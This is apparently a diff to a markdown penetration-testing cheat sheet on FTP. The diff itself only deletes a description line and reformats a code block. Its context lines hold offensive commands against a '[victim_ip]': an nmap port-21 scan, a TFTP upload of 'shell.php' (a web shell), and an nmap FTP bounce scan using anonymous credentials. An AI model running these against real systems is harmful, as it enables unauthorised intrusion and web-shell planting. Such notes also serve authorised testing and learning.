@@ -1,5 +1,4 @@
 ### FTP:
-FTP protocol is used to transfer files from one machine to another machine
 
 ##### nmap:
 - nmap -p 21 -sV [victim_ip]
@@ -43,10 +42,9 @@ FTP protocol is used to transfer files from one machine to another machine
 - tftp> put shell.php
 
 ##### Windows dir change with ~1
-```
-cd /Docume~1/
-cd /Progra~1/
-```
+- cd /Docume~1/
+- cd /Progra~1/
+
 ##### FTP Bounce Scan
 nmap –top-ports 1000 -vv -Pn -b anonymous:password@[victim_ip:21] 127.0.0.1
 
